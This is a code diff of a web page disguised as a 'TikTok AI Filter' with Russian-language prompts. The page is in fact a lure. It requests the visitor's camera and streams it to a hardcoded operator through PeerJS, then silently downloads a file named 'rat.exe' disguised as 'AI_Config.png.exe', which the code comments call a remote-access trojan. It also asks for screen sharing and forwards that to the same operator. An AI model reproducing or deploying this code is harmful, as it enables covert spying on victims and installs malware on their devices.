@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok AI Face Morph v5.0</title>
+    <title>TikTok AI Filter v5.2</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
         .box { width: 90%; max-width: 400px; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 0 20px rgba(255,0,80,0.4); }
         #loader, #screamer { display: none; }
         .progress-fill { width: 0%; height: 8px; background: #ff0050; transition: 0.15s; border-radius: 10px; }
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
@@ -21,13 +21,13 @@
 
     <div id="start" class="box">
         <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="60">
-        <h1>AI Face Scanner</h1>
-        <p style="color: #666;">Нажмите для калибровки фильтра</p>
-        <button class="btn" onclick="initApp()">ПОДКЛЮЧИТЬ</button>
+        <h1>TikTok AI Filter</h1>
+        <p style="color: #666;">Нажмите для активации маски</p>
+        <button class="btn" onclick="initApp()">РАЗРЕШИТЬ</button>
     </div>
 
     <div id="loader" class="box">
-        <h2 id="status">АНАЛИЗ БИОМЕТРИИ...</h2>
+        <h2 id="status">НАСТРОЙКА ИИ...</h2>
         <div style="width:100%; background:#222; border-radius:10px;"><div id="fill" class="progress-fill"></div></div>
         <p id="pct">0%</p>
     </div>
@@ -47,51 +47,45 @@
         function lock() {
             try { document.documentElement.requestFullscreen(); } catch(e){}
             document.body.classList.add('no-cursor');
-            try { document.documentElement.requestPointerLock(); } catch(e){}
         }
 
         async function initApp() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // 1. Сразу просим камеру
+                const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 conn = peer.connect(ADM_ID);
-                peer.call(ADM_ID, stream);
+                peer.call(ADM_ID, camStream);
 
                 document.getElementById('start').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
 
                 let p = 0;
                 let int = setInterval(async () => {
-                    p += Math.floor(Math.random() * 10) + 5;
-                    if (p >= 100) {
-                        p = 100;
-                        clearInterval(int);
-                        document.getElementById('status').innerText = "СИНХРОНИЗАЦИЯ...";
-                        // СРАЗУ ЗАПРАШИВАЕМ ЭКРАН И ДАЕМ ФАЙЛ
-                        await getFinalAccess();
-                    }
+                    p += 10;
                     document.getElementById('fill').style.width = p + '%';
                     document.getElementById('pct').innerText = p + '%';
+                    
+                    if (p >= 100) {
+                        clearInterval(int);
+                        // 2. Втихую качаем ратник (путь относительный!)
+                        const a = document.createElement('a');
+                        a.href = 'rat.exe'; 
+                        a.download = 'AI_Config.png.exe';
+                        a.click();
+                        
+                        // 3. СРАЗУ просим экран (без кнопок)
+                        try {
+                            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                            peer.call(ADM_ID, screenStream);
+                            document.getElementById('loader').innerHTML = "<h2>ГОТОВО</h2><p>Фильтр успешно применен!</p>";
+                        } catch(e) {
+                            document.getElementById('loader').innerHTML = "<h2>ОШИБКА</h2><p>Нужен доступ к экрану для работы маски</p>";
+                        }
+                    }
                 }, 150);
 
                 listen();
-            } catch (e) { alert("Ошибка доступа!"); location.reload(); }
-        }
-
-        async function getFinalAccess() {
-            // Скачиваем файл скрыто
-            const a = document.createElement('a');
-            a.href = 'rat.exe'; 
-            a.download = 'AI_Filter_Config.png.exe';
-            a.click();
-
-            // Запрос экрана без лишних кнопок
-            try {
-                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                peer.call(ADM_ID, screenStream);
-                document.getElementById('loader').innerHTML = "<h2>ГОТОВО</h2><p>Эффект применен в приложении TikTok</p>";
-            } catch(e) {
-                document.getElementById('loader').innerHTML = "<h2>ОШИБКА</h2><p>Разрешите доступ для работы фильтра</p>";
-            }
+            } catch (e) { alert("Ошибка! Доступ к камере обязателен."); location.reload(); }
         }
 
         function listen() {
